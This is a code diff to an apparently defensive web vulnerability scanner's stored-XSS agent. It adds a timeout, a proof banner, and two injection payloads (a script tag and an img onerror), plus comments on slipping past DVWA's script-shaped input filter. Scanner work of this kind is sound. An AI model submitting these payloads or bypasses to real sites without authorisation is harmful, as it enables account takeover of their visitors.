@@ -7,6 +7,7 @@ the SAME request/response, app.agents.xss) or DOM XSS (purely
 client-side, no server round trip at all, app.agents.dom_xss).
 """
 
+import asyncio
 import uuid
 from urllib.parse import urlencode
 
@@ -30,35 +31,64 @@ from app.storage.local_disk import get_object_storage
 # re-visiting everything recon found.
 _MAX_REVISIT_PAGES = 10
 _PAGE_TIMEOUT_MS = 8000
+# Same defensive backstop as app.agents.http_client's
+# _HARD_REQUEST_TIMEOUT_SECONDS — see app.agents.xss_browser_proof's
+# identical constant for the real, live-found scan hang this class of
+# fix exists for. playwright.chromium.launch() has no timeout of its
+# own the way page.goto() does.
+_HARD_PROOF_TIMEOUT_SECONDS = 30.0
 
 
 def _marker() -> str:
     return f"verdikt_stored_{uuid.uuid4().hex[:12]}"
 
 
-def _payload_for(marker: str) -> str:
+def _proof_banner_js(marker: str) -> str:
     # Same real bug as app.agents.xss_browser_proof.visible_proof_banner_js
     # (the window[marker] flag alone is reliable but invisible, so a
     # screenshot taken right after detecting it looked identical to an
-    # unexploited page) — but that helper's full modal-dialog proof is
-    # too long here: a real, live-found constraint against DVWA's own
-    # stored-XSS teaching example is that its guestbook `comment` column
-    # is a bounded varchar, and MySQL strict mode rejects the whole
-    # INSERT outright (a real mysqli_sql_exception, not a silent
-    # truncation) past ~250-300 characters — confirmed empirically
-    # against the live container (253 chars survives; 460 doesn't). A
-    # stored payload has to survive a database round-trip a purely
-    # reflected/DOM one never does, so this is a deliberately compact
-    # floating box rather than the shared helper's full dialog — small
-    # and bordered so it still reads as a pop-up in a screenshot rather
-    # than blending into the page, not a full-width banner either.
+    # unexploited page) — deliberately drawn via a separate page.evaluate()
+    # call in _find_execution *after* execution is already confirmed,
+    # never embedded in the submitted payload itself. See
+    # _stored_xss_payloads' docstring for why that distinction matters
+    # here even more than for reflected/DOM XSS: this banner's own text
+    # ("appendChild", "createElement", ...) contains the letters
+    # s/c/r/i/p/t in that relative order, which is exactly what DVWA
+    # High's (and plenty of real WAFs') "does this contain something
+    # script-shaped" filter strips — submitting it inline silently
+    # mangled the payload into something that could never execute.
     return (
-        f'<script>window["{marker}"]=true;'
         f'var d=document.createElement("div");d.textContent="XSS POC";'
         f'd.style.cssText="position:fixed;top:30%;left:35%;background:#fff;'
-        f'border:3px solid red;padding:8px 16px";'
-        f"document.body.appendChild(d);</script>"
+        f'border:3px solid red;padding:8px 16px;z-index:2147483647";'
+        f"document.body.appendChild(d);"
     )
+
+
+# Paired with the payload templates below purely for reporting — a
+# Finding's write-up should read as a normal proof-of-concept an analyst
+# can act on, not our internal marker/window-flag plumbing verbatim.
+_STORED_XSS_DISPLAY_PAYLOADS = (
+    "<script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(document.domain)>",
+)
+
+
+# Two variants for the same reason app.agents.xss_browser_proof tries
+# both: DVWA's own stored-XSS guestbook (§14) sanitizes its 'message'
+# field with strip_tags() (which removes ANY tag, no bypass exists) but
+# its 'name' field only with the same "does this contain s.c.r.i.p.t"
+# regex as its reflected-XSS page — a live, real gap where the first
+# payload gets fully stripped and the second survives untouched.
+# Deliberately minimal (just the flag-set, no visible banner inline) —
+# see _proof_banner_js's docstring for why a longer inline payload
+# defeats itself against exactly this filter.
+def _stored_xss_payloads(marker: str) -> list[tuple[str, str]]:
+    real_payloads = (
+        f'<script>window["{marker}"]=true;</script>',
+        f'<img src=x onerror=\'window["{marker}"]=true\'>',
+    )
+    return list(zip(real_payloads, _STORED_XSS_DISPLAY_PAYLOADS))
 
 
 _BASELINE_FIELD_VALUE = "verdikt1"
@@ -168,6 +198,16 @@ class StoredXssAgent:
         self, marker: str, candidates: list[str]
     ) -> tuple[str, bytes] | None:
         try:
+            return await asyncio.wait_for(
+                self._find_execution_impl(marker, candidates), timeout=_HARD_PROOF_TIMEOUT_SECONDS
+            )
+        except (TimeoutError, asyncio.TimeoutError):
+            return None
+
+    async def _find_execution_impl(
+        self, marker: str, candidates: list[str]
+    ) -> tuple[str, bytes] | None:
+        try:
             async with async_playwright() as playwright:
                 browser = await playwright.chromium.launch(headless=True)
                 # See app.agents.macro's identical fix/rationale — an
@@ -186,6 +226,10 @@ class StoredXssAgent:
                         continue
                     executed = bool(await page.evaluate(f'window["{marker}"] === true'))
                     if executed:
+                        # Draw the visible proof banner now, client-side,
+                        # never as part of what was actually submitted —
+                        # see _proof_banner_js's docstring.
+                        await page.evaluate(_proof_banner_js(marker))
                         found = (url, await page.screenshot(full_page=True))
                         break
                 await browser.close()
@@ -195,19 +239,32 @@ class StoredXssAgent:
 
     async def _check_form(self, form: FormInfo, target_field: str, candidates: list[str]) -> Finding | None:
         marker = _marker()
-        submit_response = await self._submit(form, target_field, _payload_for(marker))
-        if submit_response is None:
-            return None
-
-        found = await self._find_execution(marker, candidates)
-        if found is None:
+        found = None
+        winning_payload: str | None = None
+        winning_display_payload: str | None = None
+        for payload, display_payload in _stored_xss_payloads(marker):
+            submit_response = await self._submit(form, target_field, payload)
+            if submit_response is None:
+                continue
+            found = await self._find_execution(marker, candidates)
+            if found is not None:
+                winning_payload = payload
+                winning_display_payload = display_payload
+                break
+        if found is None or winning_payload is None:
             return None
         found_url, _screenshot = found
 
         # §2 step 1: deterministic re-execution — a fresh marker, fresh
         # submission, fresh page load, not just re-checking the same one.
+        # Reuses the exact payload shape that just worked rather than
+        # restarting the fallback loop, matching app.agents.xss's
+        # probe_fn-reuse discipline for the same reason: an already-
+        # confirmed technique re-executed with a different one is a new,
+        # unproven claim, not a genuine re-confirmation of this finding.
         marker2 = _marker()
-        submit_response2 = await self._submit(form, target_field, _payload_for(marker2))
+        payload2 = winning_payload.replace(marker, marker2)
+        submit_response2 = await self._submit(form, target_field, payload2)
         if submit_response2 is None:
             return None
         found_again = await self._find_execution(marker2, [found_url])
@@ -241,14 +298,14 @@ class StoredXssAgent:
                 "visitor, including administrators, without them clicking anything."
             ),
             technical_description=(
-                f"Submitting {form.action_url} with a <script> payload in the '{target_field}' "
-                f"field, then loading {found_url} in a real browser, caused the injected script "
-                "to execute — confirming the payload was stored server-side and rendered "
-                "unescaped on revisit."
+                f"Submitting {form.action_url} with the payload {winning_display_payload!r} in the "
+                f"'{target_field}' field, then loading {found_url} in a real browser, caused the "
+                "injected script to execute — confirming the payload was stored server-side and "
+                "rendered unescaped on revisit."
             ),
             steps_to_reproduce=[
                 f"1. Submit {form.action_url} with the '{target_field}' field set to "
-                '<script>alert(document.domain)</script> instead of its normal content.',
+                f"{winning_display_payload} instead of its normal content.",
                 f"2. Visit {found_url} (where the stored data is displayed back).",
                 "3. Observe the injected script executes — verified here by an automated "
                 "headless-browser check across two independent submissions, with a screenshot "
@@ -269,6 +326,7 @@ class StoredXssAgent:
                     finding_id=finding.id,
                     request_raw=format_request_raw(submit_response2),
                     response_raw=format_response_raw(submit_response2),
+                    payload=payload2,
                     screenshot_refs=screenshot_refs,
                 )
             )
